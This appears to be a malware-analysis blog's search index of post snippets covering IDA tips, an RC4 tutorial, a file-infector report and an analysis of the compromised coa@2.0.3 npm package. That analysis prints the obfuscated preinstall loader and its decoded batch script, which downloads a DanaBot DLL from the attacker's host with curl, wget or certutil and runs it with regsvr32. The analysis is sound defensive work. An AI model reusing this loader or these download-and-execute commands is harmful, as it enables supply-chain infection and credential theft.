[ { "title": "Hex-Rays IDA Tips and Tricks", "url": "/posts/Hex-Rays-IDA-Tips-and-Tricks/", "categories": "Blogging, Malware-Analysis", "tags": "ida, tips-and-tricks", "date": "2021-11-23 11:07:00 -0800", "snippet": "Hex-Rays tips and tricks to IDA ProIgor Skochinsky of Hex-Rays presents a new IDA Pro tip every week. This is more of a pointer toward a “season 1” compilation of these tips and to the Hex-Rays blog where they continue to be posted.The first 52 tips have been compiled into a single PDF document (by Hex-Rays):https://hex-rays.com/blog/igors-tip-of-the-week-season-01/The continued series is can be found at:https://hex-rays.com/blog/Some favoritesNOTE: The below text and examples are extracts from Igor’s tips and not my commentary, but shown to give you a taste of what you can expect#35 Demangled namesName simplificationSome deceptively simple-looking names may end up very complicated after compilation, especially when templates are involved. For example, a simple std::string1 from STL actually expands tostd::basic_string&amp;lt;char,std::char_traits&amp;lt;char&amp;gt;,std::allocator&amp;lt;char&amp;gt;&amp;gt;To ensure interoperability, the compiler has to preserve these details in the mangled name, so they reappear on demangling; however, such implementation details are usually not interesting to a human reader who would prefer to see a simple std::string again. This is why IDA implements name simplification as a post-processing step. Using the rules in the file cfg/goodname.cfg, IDA applies them to transform a name likestd::basic_string&amp;lt;char,struct std::char_traits&amp;lt;char&amp;gt;,class std::allocator&amp;lt;char&amp;gt; &amp;gt; &amp;amp; __thiscall std::ba- sic_string&amp;lt;char,struct std::char_traits&amp;lt;char&amp;gt;, class std::allocator&amp;lt;char&amp;gt; &amp;gt;::erase(unsigned int,unsigned int)intostd::string &amp;amp; std::string::erase(unsigned int,unsigned int)which is much easier to read and understand.#18 Decompiler and global cross-referencesGlobal cross-referencesIf you have a well-analyzed database with custom types used by the program and properly set up function prototypes, you can ask the decompiler to analyze all functions and build a list of cross-references to a structure field, an enum member or a whole local type. The default hotkey is Ctrl-Alt-X.When you use it for the first time, the list may be empty or include only recently decompiled functions.To cover all functions, refresh the list from the context menu or by pressing Ctrl-U. This will decompile all functions in the database and gather the complete list. The decompilation results are cached so next time you use the feature it will be faster." }, { "title": "NPM COA@2.0.3 DanaBot Dropper", "url": "/posts/Npm_Coa_203_DanaBot_Dropper/", "categories": "Blogging, Malware-Analysis", "tags": "malware, report, obfuscation, javascript, danabot", "date": "2021-11-08 04:35:00 -0800", "snippet": "Table of Contents Executive Summary Actions leading to a DanaBot secondary payload Visual path of execution What gets dropped? IOC’s Technical Analysis Deobfuscating: compile.js Deobfuscating: compile.bat ConclusionExecutive SummaryA malicious actor committed a change to the coa NPM package and pushed version 2.0.3 with the malicious content. Developer builds started having issues which brought this to people’s attention.The affected repository was https://www.npmjs.com/package/coa and an issue was opened exposing this at https://github.com/veged/coa/issues/99.A diff showed two new files added and changes to the packages.json file adding a preinstall command that kicks off the new malicious activity which can be seen at https://my.diffend.io/npm/coa/2.0.2/2.0.4/page/1#d2h-689903.Actions leading to a DanaBot secondary payload The new change included a preinstall command to run compile.js via node The obfuscated compile.js file ends up calling the compile.bat file ONLY Windows machines are targeted in this case, if Windows then: child_proccess.spawn(&quot;cmd.exe /c compile.bat&quot;) The obfuscated compile.bat file attempts to get a secondary payload and then runs itAttempt 1: curl https://pastorcryptograph.at/3/sdd.dll -o compile.dllAttempt 2: wget https://pastorcryptograph.at/3/sdd.dll -O compile.dllAttempt 3: certutil.exe -urlcache -f https://pastorcryptograph.at/3/sdd.dll compile.dllregsvr32.exe -s compile.dllVisual path of executionWhat gets dropped?Rules matched this secondary payload to be a DanaBot information stealer. I successfully pulled down the DanaBot malware payload but have not analyzed this yet to identify any changed functionality from previous samples. Via config extractors I have pulled the C2 addresses.IOC’sC2 Name Value C2 185.106.123.228:443 C2 193.42.36.59:443 C2 193.56.146.53:443 C2 185.117.90.36:443 MD5 hashes Name Value MD5 (compile.js) accbf560283950ef17bb22164f7003ae MD5 (compile.bat) 59f3cfd4525da8b7df2815f0ec1a13f1 MD5 (compile.dll) f778af11f5e5b2a1ee4ed8e54461e85a Technical AnalysisDeobfuscating: compile.jsThe following details the analysis of the compile.js file that was checked into the repository. This is the start of the attack as it gets executed in node via the preinstall in package.jsonObfuscated javascriptThe following obfuscated javascript is the contents of the file as it was checked in.const _0x29286e=_0x3b9e;(function(_0x595213,_0x1c7f12){const _0x524030=_0x3b9e,_0x10bbc4=_0x595213();while(!![]){try{const _0x5ab451=parseInt(_0x524030(0xef))/0x1*(-parseInt(_0x524030(0xfa))/0x2)+parseInt(_0x524030(0xf7))/0x3+-parseInt(_0x524030(0xf6))/0x4*(parseInt(_0x524030(0xf5))/0x5)+-parseInt(_0x524030(0xf2))/0x6*(-parseInt(_0x524030(0xed))/0x7)+-parseInt(_0x524030(0xf8))/0x8*(parseInt(_0x524030(0xe9))/0x9)+parseInt(_0x524030(0xeb))/0xa+parseInt(_0x524030(0xf3))/0xb*(parseInt(_0x524030(0xf4))/0xc);if(_0x5ab451===_0x1c7f12)break;else _0x10bbc4[&#39;push&#39;](_0x10bbc4[&#39;shift&#39;]());}catch(_0x3b1efb){_0x10bbc4[&#39;push&#39;](_0x10bbc4[&#39;shift&#39;]());}}}(_0x4f67,0x3d733));const {exec}=require(&#39;child_process&#39;);function _0x4f67(){const _0x5d7817=[&#39;28bejTPQ&#39;,&#39;1355673ZDaxId&#39;,&#39;779896MgsJdu&#39;,&#39;child_process&#39;,&#39;26358GzOkXk&#39;,&#39;MacOS&#39;,&#39;platform&#39;,&#39;cmd.exe&#39;,&#39;win64&#39;,&#39;27EVEPMY&#39;,&#39;win32&#39;,&#39;768760SJubeg&#39;,&#39;Linux&#39;,&#39;111587KPhwpG&#39;,&#39;compile.bat&#39;,&#39;11xGbwXc&#39;,&#39;linux&#39;,&#39;darwin&#39;,&#39;36HiOlse&#39;,&#39;11PTXHjR&#39;,&#39;3696096qOooYF&#39;,&#39;173780mPHnxy&#39;];_0x4f67=function(){return _0x5d7817;};return _0x4f67();}var opsys=process[_0x29286e(0xfc)];function _0x3b9e(_0x21f5ee,_0x411966){const _0x4f6708=_0x4f67();return _0x3b9e=function(_0x3b9ecb,_0x3ac81f){_0x3b9ecb=_0x3b9ecb-0xe9;let _0x5a6794=_0x4f6708[_0x3b9ecb];return _0x5a6794;},_0x3b9e(_0x21f5ee,_0x411966);}if(opsys==_0x29286e(0xf1))opsys=_0x29286e(0xfb);else{if(opsys==_0x29286e(0xea)||opsys==_0x29286e(0xfe)){opsys=&#39;Windows&#39;;const {spawn}=require(_0x29286e(0xf9)),bat=spawn(_0x29286e(0xfd),[&#39;/c&#39;,_0x29286e(0xee)]);}else opsys==_0x29286e(0xf0)&amp;amp;&amp;amp;(opsys=_0x29286e(0xec));}DeobfuscationI ran the above code through https://deobfuscate.io to help make more sense of it. The code is still in an obfuscated state and needed to be understood better.const _0x29286e = _0x3b9e;(function (_0x595213, _0x1c7f12) { const _0x524030 = _0x3b9e, _0x10bbc4 = _0x595213(); while (!![]) { try { const _0x5ab451 = parseInt(_0x524030(239)) / 1 * (-parseInt(_0x524030(250)) / 2) + parseInt(_0x524030(247)) / 3 + -parseInt(_0x524030(246)) / 4 * (parseInt(_0x524030(245)) / 5) + -parseInt(_0x524030(242)) / 6 * (-parseInt(_0x524030(237)) / 7) + -parseInt(_0x524030(248)) / 8 * (parseInt(_0x524030(233)) / 9) + parseInt(_0x524030(235)) / 10 + parseInt(_0x524030(243)) / 11 * (parseInt(_0x524030(244)) / 12); if (_0x5ab451 === _0x1c7f12) break; else _0x10bbc4.push(_0x10bbc4.shift()); } catch (_0x3b1efb) { _0x10bbc4.push(_0x10bbc4.shift()); } }}(_0x4f67, 251699));const {exec} = require(&quot;child_process&quot;);function _0x4f67() { const _0x5d7817 = [&quot;28bejTPQ&quot;, &quot;1355673ZDaxId&quot;, &quot;779896MgsJdu&quot;, &quot;child_process&quot;, &quot;26358GzOkXk&quot;, &quot;MacOS&quot;, &quot;platform&quot;, &quot;cmd.exe&quot;, &quot;win64&quot;, &quot;27EVEPMY&quot;, &quot;win32&quot;, &quot;768760SJubeg&quot;, &quot;Linux&quot;, &quot;111587KPhwpG&quot;, &quot;compile.bat&quot;, &quot;11xGbwXc&quot;, &quot;linux&quot;, &quot;darwin&quot;, &quot;36HiOlse&quot;, &quot;11PTXHjR&quot;, &quot;3696096qOooYF&quot;, &quot;173780mPHnxy&quot;]; _0x4f67 = function () { return _0x5d7817; }; return _0x4f67();}var opsys = process[_0x29286e(252)];function _0x3b9e(_0x21f5ee, _0x411966) { const _0x4f6708 = _0x4f67(); return _0x3b9e = function (_0x3b9ecb, _0x3ac81f) { _0x3b9ecb = _0x3b9ecb - 233; let _0x5a6794 = _0x4f6708[_0x3b9ecb]; return _0x5a6794; }, _0x3b9e(_0x21f5ee, _0x411966);}if (opsys == _0x29286e(241)) opsys = _0x29286e(251); else { if (opsys == _0x29286e(234) || opsys == _0x29286e(254)) { opsys = &quot;Windows&quot;; const {spawn} = require(_0x29286e(249)), bat = spawn(_0x29286e(253), [&quot;/c&quot;, _0x29286e(238)]); } else opsys == _0x29286e(240) &amp;amp;&amp;amp; (opsys = _0x29286e(236));}Fully annotated analysis of javascriptAfter I analyzed the javascript and updated the variables I produced the commented file below.High level: Rotating array The script works by pre-creating an array of alphanumeric text, some of which produce integers to be used in a mathematical calculation The script starts by performing this calculation with an expected mathematical result and if it fails it rotates the array by one and attempts again until it succeeds The end result is the same array of fields but in a new order Detects whether it is running on MacOS, Windows, or Linux If running on Windows it will execute child_proccess.spawn(&quot;cmd.exe /c compile.bat&quot;)const ptr_func3 = func3;// This rotates the values in the array until the magical result compares to 251699(function (rotating_array, target_value) { const ptr_func3 = func3, ptr_rotating_array = rotating_array(); while (!![]) { // while(True) try { const result_value = parseInt(ptr_func3(239)) / 1 * (-parseInt(ptr_func3(250)) / 2) + parseInt(ptr_func3(247)) / 3 + -parseInt(ptr_func3(246)) / 4 * (parseInt(ptr_func3(245)) / 5) + -parseInt(ptr_func3(242)) / 6 * (-parseInt(ptr_func3(237)) / 7) + -parseInt(ptr_func3(248)) / 8 * (parseInt(ptr_func3(233)) / 9) + parseInt(ptr_func3(235)) / 10 + parseInt(ptr_func3(243)) / 11 * (parseInt(ptr_func3(244)) / 12); if (result_value === target_value) break; else // move first element of array to end ptr_rotating_array.push(ptr_rotating_array.shift()); } catch (Exception) { // exceptions occur since parseInt attempt to perform it on text ptr_rotating_array.push(ptr_rotating_array.shift()); } }}(get_array_string, 251699));const {exec} = require(&quot;child_process&quot;);// Number passed in minus 233 is the index value to retrieve// NOTE1: parseInt against a value like 779896MgsJdu will return the integers and ignore the characters (they are junk)// NOTE2: -parseInt will simply make the above number a negativefunction get_array_string() { const value_array = [&quot;28bejTPQ&quot;, &quot;1355673ZDaxId&quot;, &quot;779896MgsJdu&quot;, &quot;child_process&quot;, &quot;26358GzOkXk&quot;, &quot;MacOS&quot;, &quot;platform&quot;, &quot;cmd.exe&quot;, &quot;win64&quot;, &quot;27EVEPMY&quot;, &quot;win32&quot;, &quot;768760SJubeg&quot;, &quot;Linux&quot;, &quot;111587KPhwpG&quot;, &quot;compile.bat&quot;, &quot;11xGbwXc&quot;, &quot;linux&quot;, &quot;darwin&quot;, &quot;36HiOlse&quot;, &quot;11PTXHjR&quot;, &quot;3696096qOooYF&quot;, &quot;173780mPHnxy&quot;]; get_array_string = function () { return value_array; }; return get_array_string();}// NOTE: The array has been rotated now and the ptr_func3 and func3 array values are against that array// The rotated array is:// [&#39;27EVEPMY&#39;, &#39;win32&#39;, &#39;768760SJubeg&#39;, &#39;Linux&#39;, &#39;111587KPhwpG&#39;, &#39;compile.bat&#39;, &#39;11xGbwXc&#39;, &#39;linux&#39;, // &#39;darwin&#39;, &#39;36HiOlse&#39;, &#39;11PTXHjR&#39;, &#39;3696096qOooYF&#39;, &#39;173780mPHnxy&#39;, &#39;28bejTPQ&#39;, &#39;1355673ZDaxId&#39;, // &#39;779896MgsJdu&#39;, &#39;child_process&#39;, &#39;26358GzOkXk&#39;, &#39;MacOS&#39;, &#39;platform&#39;, &#39;cmd.exe&#39;, &#39;win64&#39;]var opsys = process[ptr_func3(252)]; // platformfunction func3(_0x21f5ee, _0x411966) { const value_string = get_array_string(); return func3 = function (_0x3b9ecb, _0x3ac81f) { _0x3b9ecb = _0x3b9ecb - 233; let _0x5a6794 = value_string[_0x3b9ecb]; return _0x5a6794; }, func3(_0x21f5ee, _0x411966);}if (opsys == ptr_func3(241) /*darwin*/) opsys = ptr_func3(251 /*MacOS*/); else { if (opsys == ptr_func3(234) /*win32*/ || opsys == ptr_func3(254) /*win64*/) { opsys = &quot;Windows&quot;; // EXEC: child_proccess.spawn(&quot;cmd.exe /c compile.bat&quot;) const {spawn} = require(ptr_func3(249) /*child_process*/), bat = spawn(ptr_func3(253) /*cmd.exe*/, [&quot;/c&quot;, ptr_func3(238) /*compile.bat*/]); } else opsys == ptr_func3(240) /*linux*/ &amp;amp;&amp;amp; (opsys = ptr_func3(236) /*Linux*/);}Array rotationThe interesting part of this script is the rotation of the items in the array. The items will continue to be rotated until a mathematical condition is met.The following python script emulates the logic of what is happening in the javascript.import revalue_array = [&quot;28bejTPQ&quot;, &quot;1355673ZDaxId&quot;, &quot;779896MgsJdu&quot;, &quot;child_process&quot;, &quot;26358GzOkXk&quot;, &quot;MacOS&quot;, &quot;platform&quot;, &quot;cmd.exe&quot;, &quot;win64&quot;, &quot;27EVEPMY&quot;, &quot;win32&quot;, &quot;768760SJubeg&quot;, &quot;Linux&quot;, &quot;111587KPhwpG&quot;, &quot;compile.bat&quot;, &quot;11xGbwXc&quot;, &quot;linux&quot;, &quot;darwin&quot;, &quot;36HiOlse&quot;, &quot;11PTXHjR&quot;, &quot;3696096qOooYF&quot;, &quot;173780mPHnxy&quot;]target_value = 251699def parseInt(sin): m = re.search(r&#39;^(\\d+)[.,]?\\d*?&#39;, str(sin)) return int(m.groups()[-1]) if m and not callable(sin) else Nonedef get_array_value(value): return value_array[value - 233] def rotate(): temp = value_array[0] value_array.remove(temp) value_array.append(temp)while True: try: result = parseInt(get_array_value(239)) / 1 * (-parseInt(get_array_value(250)) / 2) + parseInt(get_array_value(247)) / 3 + -parseInt(get_array_value(246)) / 4 * (parseInt(get_array_value(245)) / 5) + -parseInt(get_array_value(242)) / 6 * (-parseInt(get_array_value(237)) / 7) + -parseInt(get_array_value(248)) / 8 * (parseInt(get_array_value(233)) / 9) + parseInt(get_array_value(235)) / 10 + parseInt(get_array_value(243)) / 11 * (parseInt(get_array_value(244)) / 12) if result == target_value: break else: rotate() except: rotate()print(value_array)Output[&#39;27EVEPMY&#39;, &#39;win32&#39;, &#39;768760SJubeg&#39;, &#39;Linux&#39;, &#39;111587KPhwpG&#39;, &#39;compile.bat&#39;, &#39;11xGbwXc&#39;, &#39;linux&#39;, &#39;darwin&#39;, &#39;36HiOlse&#39;, &#39;11PTXHjR&#39;, &#39;3696096qOooYF&#39;, &#39;173780mPHnxy&#39;, &#39;28bejTPQ&#39;, &#39;1355673ZDaxId&#39;, &#39;779896MgsJdu&#39;, &#39;child_process&#39;, &#39;26358GzOkXk&#39;, &#39;MacOS&#39;, &#39;platform&#39;, &#39;cmd.exe&#39;, &#39;win64&#39;]Deobfuscating: compile.batThe batch file was also obfuscated and the original contents are shown below. The process to reverse this was pretty straight forward as there is clearly a string that the batch file indexes into for each character.To unravel this I created a python script to print it out into plaintext.compile.bat (original)@echo offSet aim=dgYfeRCiI6tM5ySU4AFWnGwu7j3VBTPD82cHblKEvJhQqozN1sxZL0rm9apXkOcls@%aim:~4,1%%aim:~34,1%%aim:~42,1%%aim:~45,1% %aim:~45,1%%aim:~3,1%%aim:~3,1%%aim:~34,1%%aim:~23,1%%aim:~54,1%%aim:~37,1% %aim:~42,1%%aim:~10,1%%aim:~10,1%%aim:~58,1%%aim:~49,1%://%aim:~58,1%%aim:~57,1%%aim:~49,1%%aim:~10,1%%aim:~45,1%%aim:~54,1%%aim:~34,1%%aim:~54,1%%aim:~13,1%%aim:~58,1%%aim:~10,1%%aim:~45,1%%aim:~1,1%%aim:~54,1%%aim:~57,1%%aim:~58,1%%aim:~42,1%.%aim:~57,1%%aim:~10,1%/%aim:~26,1%/%aim:~49,1%%aim:~0,1%%aim:~0,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1% -%aim:~45,1% %aim:~34,1%%aim:~45,1%%aim:~55,1%%aim:~58,1%%aim:~7,1%%aim:~37,1%%aim:~4,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1%%aim:~7,1%%aim:~3,1% %aim:~20,1%%aim:~45,1%%aim:~10,1% %aim:~4,1%%aim:~50,1%%aim:~7,1%%aim:~49,1%%aim:~10,1% %aim:~34,1%%aim:~45,1%%aim:~55,1%%aim:~58,1%%aim:~7,1%%aim:~37,1%%aim:~4,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1% ( %aim:~22,1%%aim:~1,1%%aim:~4,1%%aim:~10,1% %aim:~42,1%%aim:~10,1%%aim:~10,1%%aim:~58,1%%aim:~49,1%://%aim:~58,1%%aim:~57,1%%aim:~49,1%%aim:~10,1%%aim:~45,1%%aim:~54,1%%aim:~34,1%%aim:~54,1%%aim:~13,1%%aim:~58,1%%aim:~10,1%%aim:~45,1%%aim:~1,1%%aim:~54,1%%aim:~57,1%%aim:~58,1%%aim:~42,1%.%aim:~57,1%%aim:~10,1%/%aim:~26,1%/%aim:~49,1%%aim:~0,1%%aim:~0,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1% -%aim:~61,1% %aim:~34,1%%aim:~45,1%%aim:~55,1%%aim:~58,1%%aim:~7,1%%aim:~37,1%%aim:~4,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1%)%aim:~7,1%%aim:~3,1% %aim:~20,1%%aim:~45,1%%aim:~10,1% %aim:~4,1%%aim:~50,1%%aim:~7,1%%aim:~49,1%%aim:~10,1% %aim:~34,1%%aim:~45,1%%aim:~55,1%%aim:~58,1%%aim:~7,1%%aim:~37,1%%aim:~4,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1% ( %aim:~34,1%%aim:~4,1%%aim:~54,1%%aim:~10,1%%aim:~23,1%%aim:~10,1%%aim:~7,1%%aim:~37,1%.%aim:~4,1%%aim:~50,1%%aim:~4,1% -%aim:~23,1%%aim:~54,1%%aim:~37,1%%aim:~34,1%%aim:~57,1%%aim:~34,1%%aim:~42,1%%aim:~4,1% -%aim:~3,1% %aim:~42,1%%aim:~10,1%%aim:~10,1%%aim:~58,1%%aim:~49,1%://%aim:~58,1%%aim:~57,1%%aim:~49,1%%aim:~10,1%%aim:~45,1%%aim:~54,1%%aim:~34,1%%aim:~54,1%%aim:~13,1%%aim:~58,1%%aim:~10,1%%aim:~45,1%%aim:~1,1%%aim:~54,1%%aim:~57,1%%aim:~58,1%%aim:~42,1%.%aim:~57,1%%aim:~10,1%/%aim:~26,1%/%aim:~49,1%%aim:~0,1%%aim:~0,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1% %aim:~34,1%%aim:~45,1%%aim:~55,1%%aim:~58,1%%aim:~7,1%%aim:~37,1%%aim:~4,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1%)%aim:~54,1%%aim:~4,1%%aim:~1,1%%aim:~49,1%%aim:~40,1%%aim:~54,1%%aim:~26,1%%aim:~33,1%.%aim:~4,1%%aim:~50,1%%aim:~4,1% -%aim:~49,1% %aim:~34,1%%aim:~45,1%%aim:~55,1%%aim:~58,1%%aim:~7,1%%aim:~37,1%%aim:~4,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1%Python to deobfuscateimport reaim = &quot;dgYfeRCiI6tM5ySU4AFWnGwu7j3VBTPD82cHblKEvJhQqozN1sxZL0rm9apXkO&quot;content = r&quot;&amp;lt;the content from the original file&amp;gt;&quot;# Decode from %aim:~##,#% to letterdef decode(data): m = re.findall(r&#39;%aim:~([0-9]\\d?\\d?)&#39;, data) return aim[int(m[0])]# handle each line separatelycommands = content.split(r&#39;\\n&#39;)first_command = Truefor command in commands: matches = re.findall(r&#39;%aim:~[0-9]\\d?\\d?,1%&#39;, command) for match in matches: command = command.replace(match, decode(match)) if first_command: print(&#39;@&#39; + command) first_command = False else: print(command)compile.bat (plaintext)@echo offcurl https://pastorcryptograph.at/3/sdd.dll -o compile.dllif not exist compile.dll ( wget https://pastorcryptograph.at/3/sdd.dll -O compile.dll)if not exist compile.dll ( certutil.exe -urlcache -f https://pastorcryptograph.at/3/sdd.dll compile.dll)regsvr32.exe -s compile.dllConclusionThis is an example of a supply chain attack where NPM was impacted and is a trusted source for developer builds around the world.Any builds that were setup to pull the latest version of the package may have picked it up between the time the package was pushed until taken down.What I’ve shown above is the initial phase of the attacker infecting a Windows machine to pull down the secondary payload and execute it on the machine. In this case, it is the DanaBot InfoStealer." }, { "title": "Malware Report: CTS", "url": "/posts/MalwareReport-CTS/", "categories": "Blogging, Malware-Analysis", "tags": "malware, rc4, crypto, ida, debugging, report", "date": "2021-06-10 15:42:00 -0700", "snippet": "Table of Contents Executive Summary Initial binary Infected binaries MITRE Attack Matrix Indicators of Compromise Threat intel insights Technical Analysis Persistance Monitor logical drives Main thread infection loop Infected file execution ConclusionExecutive SummaryThis sample was recently pulled from VirusTotal while looking for samples that involved cryptography. The sample gains persistance and replicates itself onto other executables that it finds to further infect the system. The ultimate goal and purpose of the malware is unknown, but the damage and behavior it exhibits has been reverse engineered.There has been no evidence of communication to C2 IPs found, however, this malware behaves and operates very similar to ransomware and could be a template for how a ransomware sample would be built. Additionally, I have not seen clear evidence of how this sample is delivered to victims and only that sample submissions seem to be coming out of France.Initial binary Copies itself to Windows system and temp directories Creates persistence via registry Run keys Creates a mutex Searches for executable files within user directory to infect them with itself Executables are modified to encrypt the original content and prefix the binary with the malware The modified files use RC4 for encryption and the key is saved at the end of the modified file and located via hex 0xA535443 = “CTS” Continually monitors for removable drives to further infect Continually scans for new executables to infectInfected binaries The infected binary decrypts the original file bytes and saves it back to disk in the temp directory with a random name The file saved to the temp directory is the same hash of the file pre-infected The new file in temp is executed The infected binary once again establishes persistence by: Copying itself to the Windows system directory (overwriting any existing CTS.exe file if it exists) Updates the registry Run key MITRE Attack MatrixIndicators of Compromise Name Value Hash (MD5): CTS.EXE 8e3ecc68ad8bb0db61b5de65d8381eff Hash (SHA-1): CTS.EXE f6a89e29036c200f5f595b95e75df7ec05a64990 Hash (SHA-256): CTS.EXE 20c8baddda18909c2cd6eb78ac904fe9ac1a1e96db37698b157b12f745ce1ff8 File Size: CTS.EXE 88.50 KB (90624 bytes) File %windir%\\CTS.EXE File %temp%\\&amp;lt;random-alpha-numeric-name&amp;gt;.exe Registry \\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\CTS.EXE =&amp;gt; %windir%\\CTS.EXE Mutex Global\\3pc6RWOgectGTFqCowxjeGy3XIGPtLwNrsr2zDctYD4hAU5pj4GW7rm8gHrHyTB6 Threat intel insights There is not enough information to attribute this to a specific group Yara rules may find samples with similar code that could potentially lead to attribution to the malware authorTechnical AnalysisPersistanceWhen the initial payload gets executed on the victim machine a self replication and persistance flow takes place.During this process the malware will copy itself to the Windows system directory or temp directory depending on its permissions. The malware will then update the Windows Run key to start execution on login to persist through reboots.Monitor logical drivesThe malware will start a new thread to run an indefinite loop that checks for local and remote drives attached to the victim machine to further infect. This is a loop that that runs every half second.When decompiling this in IDA Pro we can see the loop that occurs in the thread. It is searching for drives that indicate they are of the type DRIVE_REMOVABLE or DRIVE_REMOTE and upon finding these it will fork off a thread from the malware start address.Main thread infection loopThe malware moves on to perform an infection loop. The malware will identify the path to the current users’ profile directory to start the executable file search loop from.This infection loop will continue to run indefinitely.The malware checks to see if the file is an executable and moves to the next file if it is not.When opening the executable file it will perform several checks to see if it has been infected or not. The malware will be checking for the value 0xA535443 that translates to CTS. It appears to use this as a separator or locator for data once it has re-written the binary in order to know how to find data.The are a number of locations the CTS bytes are found within the infected file, however, the key ones to highlight are show in the layout of the newly infected file.The re-written file will now: Start with the malware (and the sections and sizes will only include the malware portion of the file with the rest of the bytes going beyond the defined length of the sections that are in the PE headers Next will be the original file that is RC4 encrypted Finally, at the very end we’ll be able to locate the RC4 key that was used to perform the encryption. When the infected file runs, it will use this key to perform the decryption as we’ll see laterInfected file executionThe same malware code that is in the initial binary is also in the infected ones. The execution path splits off for the infected files during the persistance routines. The malware performs an initial check for the CTS bytes and based on this check it is either going to continue on with the initial payload or it is going to move into the infected path.The file that is going to be written to the temp directory is the original file that is RC4 encrypted. Earlier I mentioned that is was at the end of the infected binary and we can confirm that here where we can see the malware use the CTS bytes to locate the RC4 key that will be used to decrypt this file.In the below screenshot you can see where the the offset of ebx+8 is used to find the key after the CTS bytes. You can see the key bytes both in x64dbg as well as confirmed at the end of the infected file that I have opened with a hex editor.NOTE: At this point, theoretically, we would have enough information to write a tool to clean the infection and re-write all system binaries back to their original state to remove the infection (if we really needed to do this).The custom RC4 crypto routine is called to decrypt the original file bytes and write it into the new temp executable file. For additional details on the RC4 encryption/decryption routine seen here and how to identify this in malware you can refer to my previous post on this topic at:https://www.travismathison.com/posts/RC4-Crypto-Usage-In-Malware/The malware will construct a random alpha-numeric file name using the CryptGenRandom function and an alpha-numeric static string.The temp path for the user profile is fetched and the full file path is constructed for writing.In the final steps of the infected file it will start the process from the temp directory. This will launch the original binary but from within the temp directory and not the original location. Further, it will attempt to establish persistence via the original method.And finally, when you launch an infected file you can see that is appears to execute and run but it is now running out of the temp directory and not the original location.ConclusionWe have unpacked the behavior of the malware of which has the capability to establish persistance, scan the filesystem (and connected drives) for executables and take them over by copying itself into the file and encrypting the original one. Finally it can re-write the original file back to the temp directory and run it.What is the purpose of this malware? This is a good question and I don’t have an answer to it. This would certainly wreak havoc on a system and cause it to need to be restored/re-imaged similar to a ransomware attack. That said, there is no ransom demanded and, as shown above, we have learned how we can decrypt the files programmatically if we had to do a manual recovery.The next steps would be to write Yara rules on the key bytes related to this sample and perform threat hunting for other samples that appear to be using the same codebase that contain more information that could be used for attribution. Maybe we’ll get lucky?" }, { "title": "RC4 Crypto Usage in Malware", "url": "/posts/RC4-Crypto-Usage-In-Malware/", "categories": "Blogging, Malware-Analysis", "tags": "malware, rc4, crypto, ida, debugging", "date": "2021-06-08 01:16:00 -0700", "snippet": "Table of Contents Intro The malware sample used in this blog post The KSA and PRGA functions Observing call into function Key-scheduling algorithm (KSA) KSA identity permutation (initialization) KSA loop to mix in key bytes Pseudo-random generation algorithm (PRGA) ConclusionIntroDuring a deep dive analysis of a recent sample, another case of using RC4 came up and I thought it was a good example to show how it appeared in the malware. The RC4 encryption algorithm is encountered quite often in malware due to it’s ease of use and ability to hide strings and information and quickly change hashes in samples (sometimes changed dynamically per infection).The well-known wiki page with pseudo-code is found here:https://en.wikipedia.org/wiki/RC4From the pseudo-code on the wiki I translated it to python that can be used to test data and keys with:rc4.pyThe goal is to be able to spot the use of it very quickly and due to its small KSA/PRGA looping algorithm it is typically easy to spot. Examples below show a specific case of this to help see it in a real-world sample.The malware sample used in this blog post MD5 hash: 8e3ecc68ad8bb0db61b5de65d8381eff VirusTotal link to sample: https://www.virustotal.com/gui/file/20c8baddda18909c2cd6eb78ac904fe9ac1a1e96db37698b157b12f745ce1ff8/detectionThe KSA and PRGA functionsThe Key-scheduling algorithm (KSA) and the Pseudo-random generation algorithm (PRGA) may be all in one call or split into two separate calls. In the case of this sample it is observed to be a single call.The RC4 encryption can be thought of as two phases:1) Generating the S-box array by initializing it with a key2) Using the S-box array as a stream cipher to apply onto any data you want to encrypt or decryptObserving call into functionThe key pieces of information that the RC4 algorithm will be looking for is the data, the length of the data, and the key that will be used when initializing the stream cipher. When debugging live, we can see from the call into the function a pointer to the MZ byte at the start of the data that will be encrypted in ecx, the length of this data in edx, and finally the key has been identified in [esp] with the bytes highlighted in the Dump 1 window.Key-scheduling algorithm (KSA)KSA identity permutation (initialization)Pseudo-codefor i from 0 to 255 S[i] := iendforWhen looking for the presence of RC4 there are a few indicators to look for:1) Loops for 256 iterations (look for compares of 100h or sometimes FFh)2) An array being populated with the value of a counter (0, 1, 2, 3, …)When debugging live, we can see the buffer that was allocated with the series of bytes from 00 to FF. In this algorithm, the array of bytes is defined as “S” and is often referred to as the “s-box”.KSA loop to mix in key bytesPseudo-codej := 0for i from 0 to 255 j := (j + S[i] + key[i mod keylength]) mod 256 swap values of S[i] and S[j]endforYou now want to look for a second loop across the same array that:1) Loops for 100h iterations like before2) References bytes from the keyThe result of this second loop will scramble the s-box array to form the final array that will be used by the PRGA algorithm that will generate the bytes to XOR with the data to be encrypted or decrypted.Pseudo-random generation algorithm (PRGA)Pseudo-codei := 0j := 0while GeneratingOutput: i := (i + 1) mod 256 j := (j + S[i]) mod 256 swap values of S[i] and S[j] K := S[(S[i] + S[j]) mod 256] output KendwhileThe PRGA algorithm is where the magic happens and the bytes to XOR with your data bytes happen.There are several indicators to look for when trying to identify this in the assembly:1) This will be a third loop but will continue to the length of the data2) The loop will be iterating over each byte in the data3) At the very end of the loop you should see a XOR operation against the generated PRGA byte and a byte from the dataAs this loop iterates you can watch the plaintext bytes in memory slowly encrypt.ConclusionSince RC4 is used so heavily in malware it is important to be able to identify this quickly in static analysis reviews. Fortunately, due to the very distinct sequence of 100h loops it is usually easy to identify and confirm." }, { "title": "Resolving IAT with AGDCservices Scripts", "url": "/posts/Resolving-IAT-with-AGDCservices-scripts/", "categories": "Blogging, Malware-Analysis", "tags": "malware, hermes, ransomware, debugging, ida, ghidra, memory, techniques", "date": "2021-05-25 11:15:00 -0700", "snippet": "Table of Contents Intro Attribution My IDA Pro 7.6 plugin scripts (rough conversion of theirs) Details Color coding instructions IAT Resolution The IDA Pro plugin to use this output ConclusionIntroRansomware is a big topic that keeps getting more and more attention. I 